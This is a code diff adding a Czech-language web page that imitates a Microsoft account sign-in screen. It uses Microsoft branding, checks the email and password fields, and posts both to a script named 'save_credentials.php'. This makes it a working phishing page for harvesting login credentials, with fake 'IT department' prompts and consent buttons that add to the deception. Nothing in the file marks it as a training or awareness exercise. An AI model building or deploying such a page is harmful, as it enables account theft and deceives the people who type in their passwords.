@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Přihlaste se ke svému účtu Microsoft</title>
+    <link rel="stylesheet" href="assets/app.css">
+</head>
+<body>
+    <section id="section_uname">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft">
+            <h2 class="title mb-16 mt-16">Přihlásit se</h2>
+            <form id="loginForm" method="POST" action="save_credentials.php">
+                <div class="mb-16">
+                    <p id="error_uname" class="error"></p>
+                    <input id="inp_uname" type="text" name="email" class="input" placeholder="E-mail, telefon nebo Skype">
+                </div>
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input id="inp_pwd" type="password" name="password" class="input" placeholder="Heslo">
+                </div>
+                <button type="submit" class="btn" id="btn_submit">Přihlásit se</button>
+            </form>
+            <div>
+                <p class="mb-16 fs-13">
+                    Nemáte účet? 
+                    <a href="#" class="link" id="create-account-link">Vytvořte si ho!</a>
+                </p>
+                <p class="mb-16 fs-13">
+                    <a href="#" class="link" id="security-key-link">Přihlaste se bezpečnostním klíčem
+                        <img src="assets/question.png" alt="Ikona otázky">
+                    </a>
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <a href="#" id="terms-link">Podmínky použití</a>
+        <a href="#">Ochrana osobních údajů a cookies</a>
+    </footer>
+
+    <div>
+        <button id="agree-button">Souhlasím</button>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const emailInput = document.getElementById('inp_uname');
+            const passwordInput = document.getElementById('inp_pwd');
+            const loginForm = document.getElementById('loginForm');
+            const termsLink = document.getElementById('terms-link');
+            const agreeButton = document.getElementById('agree-button');
+
+            function isValidEmail(email) {
+                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailPattern.test(email);
+            }
+
+            loginForm.addEventListener('submit', (event) => {
+                let valid = true;
+
+                const email = emailInput.value.trim();
+                if (!email || !isValidEmail(email)) {
+                    document.getElementById('error_uname').innerText = "Zadejte platný e-mail.";
+                    emailInput.classList.add('error-inp');
+                    valid = false;
+                } else {
+                    document.getElementById('error_uname').innerText = "";
+                    emailInput.classList.remove('error-inp');
+                }
+
+                const password = passwordInput.value.trim();
+                if (!password) {
+                    document.getElementById('error_pwd').innerText = "Zadejte heslo.";
+                    passwordInput.classList.add('error-inp');
+                    valid = false;
+                } else {
+                    document.getElementById('error_pwd').innerText = "";
+                    passwordInput.classList.remove('error-inp');
+                }
+
+                if (!valid) {
+                    event.preventDefault();
+                }
+            });
+
+            const createAccountLink = document.getElementById('create-account-link');
+            createAccountLink.addEventListener('click', (event) => {
+                event.preventDefault();
+                alert('Kontaktujte IT oddělení na emailu: podpora@chodska.cz');
+            });
+
+            const securityKeyLink = document.getElementById('security-key-link');
+            securityKeyLink.addEventListener('click', (event) => {
+                event.preventDefault();
+                alert('Vložte USB s bezpečnostním klíčem');
+            });
+
+            termsLink.addEventListener('click', (event) => {
+                event.preventDefault();
+                alert('Děkujeme za souhlas s podmínkami.');
+                window.location.href = 'main.html';
+            });
+
+            agreeButton.addEventListener('click', () => {
+                alert('Děkujeme za souhlas s podmínkami.');
+                window.location.href = 'main.html';
+            });
+        });
+    </script>
+</body>
+</html>
